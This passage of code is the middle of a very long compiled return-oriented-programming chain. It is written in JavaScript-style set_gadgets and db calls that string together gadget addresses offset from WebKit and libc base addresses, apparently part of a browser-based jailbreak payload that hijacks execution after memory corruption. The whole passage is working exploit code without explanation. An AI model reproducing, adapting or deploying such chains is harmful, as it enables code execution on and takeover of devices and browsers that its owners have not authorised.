webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L3867:
db([0,0]);
set_gadgets([
ropchain+237080,//L3867+24
ropchain+237096,//L3862
libc_base+489696,//pop rsp
ropchain+237112,//L3868
//L3862:
libc_base+489696,//pop rsp
ropchain+241080,//L3869
//L3868:
libc_base+768796
]);
//L3870:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3871:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3872:
db([25,0]);// 0x19
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3873:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+237360,//L3876
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3874:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L3876:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+237448,//L3878
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+237464,//L3879
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3878:
db([0,0]);
set_gadget(libc_base+772328,);
//L3879:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+237608,//L3882
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+237624,//L3883
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+237592,//L3881
webkit_base+4687784,
libc_base+713278
]);
//L3880:
db([24,0]);// 0x18
set_gadget(libc_base+165442,);
//L3881:
db([0,0]);
set_gadget(libc_base+772328,);
//L3882:
db([0,0]);
set_gadget(libc_base+768796,);
//L3883:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+237712,//L3885
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+237728,//L3886
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3885:
db([0,0]);
set_gadget(libc_base+772328,);
//L3886:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+237872,//L3889
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+237840,//L3887
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+237856,//L3888
webkit_base+4687784,
libc_base+165442
]);
//L3887:
db([0,0]);
set_gadget(libc_base+772328,);
//L3888:
db([0,0]);
set_gadget(libc_base+768796,);
//L3889:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+237944,//L3891
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3891:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+238000,//L3893
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3893:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+238096,//L3896
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3894:
db([4294966264,4294967295]);// -0x408
set_gadget(libc_base+772328,);
//L3896:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+238184,//L3898
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+238200,//L3899
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3898:
db([0,0]);
set_gadget(libc_base+772328,);
//L3899:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+238360,//L3901
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+238392,//L3903
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+238344,//L3900
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+238376,//L3902
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3900:
db([0,0]);
set_gadget(libc_base+165442,);
//L3901:
db([0,0]);
set_gadget(libc_base+772328,);
//L3902:
db([0,0]);
set_gadget(libc_base+768796,);
//L3903:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+238552,//L3907
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+238504,//L3904
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+238520,//L3905
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3904:
db([0,0]);
set_gadget(libc_base+165442,);
//L3905:
db([0,0]);
set_gadget(libc_base+772328,);
//L3906:
db([4,0]);// 0x4
set_gadget(libc_base+768796,);
//L3907:
db([0,0]);
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+238632,//L3908
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+238648,//L3909
webkit_base+4687784,
libc_base+772328
]);
//L3908:
db([0,0]);
set_gadget(libc_base+768796,);
//L3909:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+238736,//L3911
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3911:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+238792,//L3913
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3913:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+238920,//L3914
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+238952,//L3916
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+238936,//L3915
webkit_base+4687784,
libc_base+165442
]);
//L3914:
db([0,0]);
set_gadget(libc_base+772328,);
//L3915:
db([0,0]);
set_gadget(libc_base+768796,);
//L3916:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+239112,//L3918
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+239144,//L3920
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+239096,//L3917
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+239128,//L3919
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3917:
db([0,0]);
set_gadget(libc_base+165442,);
//L3918:
db([0,0]);
set_gadget(libc_base+772328,);
//L3919:
db([0,0]);
set_gadget(libc_base+768796,);
//L3920:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+239224,//L3921
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+239240,//L3922
webkit_base+4687784,
libc_base+165442
]);
//L3921:
db([0,0]);
set_gadget(libc_base+768796,);
//L3922:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+239336,//L3924
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+239320,//L3923
webkit_base+4687784,
libc_base+165442
]);
//L3923:
db([0,0]);
set_gadget(libc_base+768796,);
//L3924:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3926:
ropchain+239440,//L3925
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+247624,//L3927
//L3925:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+239584,//L3929
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+239600,//L3930
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+239568,//L3928
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3928:
db([0,0]);
set_gadget(libc_base+165442,);
//L3929:
db([0,0]);
set_gadget(libc_base+768796,);
//L3930:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+239728,//L3933
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+239760,//L3935
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+239744,//L3934
webkit_base+4687784,
libc_base+713278
]);
//L3932:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L3933:
db([0,0]);
set_gadget(libc_base+165442,);
//L3934:
db([0,0]);
set_gadget(libc_base+768796,);
//L3935:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+239872,//L3936+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+239864,//L3936
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L3936:
db([0,0]);
set_gadgets([
ropchain+239888,//L3936+24
ropchain+240352,//L3931
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+239960,//L3939
webkit_base+4687784,
libc_base+768796
]);
//L3937:
db([0,0]);
set_gadget(libc_base+165442,);
//L3938:
db([0,0]);
set_gadget(libc_base+772328,);
//L3939:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+240120,//L3941
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+240152,//L3943
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+240104,//L3940
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+240136,//L3942
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3940:
db([0,0]);
set_gadget(libc_base+165442,);
//L3941:
db([0,0]);
set_gadget(libc_base+772328,);
//L3942:
db([0,0]);
set_gadget(libc_base+768796,);
//L3943:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+240232,//L3944
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+240248,//L3945
webkit_base+4687784,
libc_base+165442
]);
//L3944:
db([0,0]);
set_gadget(libc_base+768796,);
//L3945:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+240344,//L3947
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+240328,//L3946
webkit_base+4687784,
libc_base+165442
]);
//L3946:
db([0,0]);
set_gadget(libc_base+768796,);
//L3947:
db([0,0]);
//L3931:
//L3948:
set_gadgets([
libc_base+713278,
ropchain+240408,//L3951
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3949:
db([4294966264,4294967295]);// -0x408
set_gadget(libc_base+772328,);
//L3951:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+240496,//L3953
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+240512,//L3954
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3953:
db([0,0]);
set_gadget(libc_base+772328,);
//L3954:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+240672,//L3956
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+240704,//L3958
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+240656,//L3955
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+240688,//L3957
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3955:
db([0,0]);
set_gadget(libc_base+165442,);
//L3956:
db([0,0]);
set_gadget(libc_base+772328,);
//L3957:
db([0,0]);
set_gadget(libc_base+768796,);
//L3958:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+240800,//L3960
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+240784,//L3959
webkit_base+4687784,
libc_base+165442
]);
//L3959:
db([0,0]);
set_gadget(libc_base+768796,);
//L3960:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+240888,//L3962
webkit_base+4687784,
libc_base+713278
]);
//L3961:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L3962:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+240960,//L3965
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3963:
db([4294966264,4294967295]);// -0x408
set_gadget(libc_base+772328,);
//L3965:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+241024,//L3967
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3967:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+489696,//pop rsp
ropchain+235800,//L3836
//L3869:
libc_base+768796
]);
//L3968:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3970:
ropchain+603832,//L3969
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3972:
ropchain+241240,//L3971
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+246296,//L3973
//L3971:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
//L3974:
libc_base+489696,//pop rsp
ropchain+229408,//L3675
//L3830:
libc_base+713278,
ropchain+241344,//L3977
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3975:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L3977:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+241432,//L3979
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+241448,//L3980
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3979:
db([0,0]);
set_gadget(libc_base+772328,);
//L3980:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+241592,//L3983
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+241608,//L3984
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+241576,//L3982
webkit_base+4687784,
libc_base+713278
]);
//L3981:
db([16,0]);// 0x10
set_gadget(libc_base+165442,);
//L3982:
db([0,0]);
set_gadget(libc_base+772328,);
//L3983:
db([0,0]);
set_gadget(libc_base+768796,);
//L3984:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+241696,//L3986
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+241712,//L3987
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3986:
db([0,0]);
set_gadget(libc_base+772328,);
//L3987:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+241872,//L3989
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+241904,//L3991
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+241856,//L3988
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+241888,//L3990
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3988:
db([0,0]);
set_gadget(libc_base+165442,);
//L3989:
db([0,0]);
set_gadget(libc_base+772328,);
//L3990:
db([0,0]);
set_gadget(libc_base+768796,);
//L3991:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+242000,//L3993
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+241984,//L3992
webkit_base+4687784,
libc_base+165442
]);
//L3992:
db([0,0]);
set_gadget(libc_base+768796,);
//L3993:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3995:
ropchain+242104,//L3994
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+174016,//_get_tclass
//L3994:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3996:
db([65,0]);// 0x41
set_gadget(libc_base+772328,);
//L3997:
db([65,0]);// 0x41
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3999:
ropchain+603856,//L3998
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L4001:
ropchain+242384,//L4000
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+161664,//_printf_
//L4000:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+242472,//L4003
webkit_base+4687784,
libc_base+768796
]);
//L4002:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L4003:
db([0,0]);
set_gadget(libc_base+165442,);
//L4004:
db([1,0]);// 0x1
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+242584,//L4006
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+242568,//L4005
webkit_base+4687784,
libc_base+165442
]);
//L4005:
db([0,0]);
set_gadget(libc_base+768796,);
//L4006:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+242680,//L4009
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4007:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L4009:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+242768,//L4011
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+242784,//L4012
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4011:
db([0,0]);
set_gadget(libc_base+772328,);
//L4012:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+242888,//L4015
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+242872,//L4014
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L4014:
db([0,0]);
set_gadget(libc_base+772328,);
//L4015:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+242944,//L4017
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4017:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
//L4018:
libc_base+713278,
ropchain+243048,//L4021
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4019:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L4021:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+243136,//L4023
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+243152,//L4024
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4023:
db([0,0]);
set_gadget(libc_base+772328,);
//L4024:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+243296,//L4027
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+243312,//L4028
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+243280,//L4026
webkit_base+4687784,
libc_base+713278
]);
//L4025:
db([8,0]);// 0x8
set_gadget(libc_base+165442,);
//L4026:
db([0,0]);
set_gadget(libc_base+772328,);
//L4027:
db([0,0]);
set_gadget(libc_base+768796,);
//L4028:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+243400,//L4030
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+243416,//L4031
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4030:
db([0,0]);
set_gadget(libc_base+772328,);
//L4031:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+243576,//L4033
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+243608,//L4035
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+243560,//L4032
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+243592,//L4034
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4032:
db([0,0]);
set_gadget(libc_base+165442,);
//L4033:
db([0,0]);
set_gadget(libc_base+772328,);
//L4034:
db([0,0]);
set_gadget(libc_base+768796,);
//L4035:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+243688,//L4036
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+243704,//L4037
webkit_base+4687784,
libc_base+165442
]);
//L4036:
db([0,0]);
set_gadget(libc_base+768796,);
//L4037:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+243816,//L4040
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+243800,//L4039
webkit_base+4687784,
libc_base+713278
]);
//L4038:
db([0,0]);
set_gadget(libc_base+165442,);
//L4039:
db([0,0]);
set_gadget(libc_base+768796,);
//L4040:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+243952,//L4042
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+243968,//L4043
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+243936,//L4041
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4041:
db([0,0]);
set_gadget(libc_base+165442,);
//L4042:
db([0,0]);
set_gadget(libc_base+768796,);
//L4043:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+244112,//L4047
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+244144,//L4049
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+244080,//L4045
webkit_base+4687784,
libc_base+165442
]);
//L4045:
db([0,0]);
set_gadget(libc_base+713278,);
//L4046:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L4047:
db([0,0]);
set_gadget(libc_base+772328,);
//L4048:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4049:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+350006,//setne al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+244264,//L4050+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+244256,//L4050
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L4050:
db([0,0]);
set_gadgets([
ropchain+244280,//L4050+24
ropchain+245496,//L4044
libc_base+713278,
ropchain+244336,//L4053
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4051:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L4053:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+244424,//L4055
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+244440,//L4056
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4055:
db([0,0]);
set_gadget(libc_base+772328,);
//L4056:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+244584,//L4059
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+244600,//L4060
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+244568,//L4058
webkit_base+4687784,
libc_base+713278
]);
//L4057:
db([12,0]);// 0xc
set_gadget(libc_base+165442,);
//L4058:
db([0,0]);
set_gadget(libc_base+772328,);
//L4059:
db([0,0]);
set_gadget(libc_base+768796,);
//L4060:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+244688,//L4062
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+244704,//L4063
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4062:
db([0,0]);
set_gadget(libc_base+772328,);
//L4063:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+244864,//L4065
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+244896,//L4067
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+244848,//L4064
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+244880,//L4066
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4064:
db([0,0]);
set_gadget(libc_base+165442,);
//L4065:
db([0,0]);
set_gadget(libc_base+772328,);
//L4066:
db([0,0]);
set_gadget(libc_base+768796,);
//L4067:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+244976,//L4068
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+244992,//L4069
webkit_base+4687784,
libc_base+165442
]);
//L4068:
db([0,0]);
set_gadget(libc_base+768796,);
//L4069:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+245104,//L4072
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+245088,//L4071
webkit_base+4687784,
libc_base+713278
]);
//L4070:
db([0,0]);
set_gadget(libc_base+165442,);
//L4071:
db([0,0]);
set_gadget(libc_base+768796,);
//L4072:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+245240,//L4074
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+245256,//L4075
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+245224,//L4073
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4073:
db([0,0]);
set_gadget(libc_base+165442,);
//L4074:
db([0,0]);
set_gadget(libc_base+768796,);
//L4075:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+245400,//L4078
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+245416,//L4079
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+245368,//L4076
webkit_base+4687784,
libc_base+165442
]);
//L4076:
db([0,0]);
set_gadget(libc_base+713278,);
//L4077:
db([0,0]);
set_gadget(libc_base+772328,);
//L4078:
db([0,0]);
set_gadget(libc_base+768796,);
//L4079:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+350006,//setne al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+245488,//L4081
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
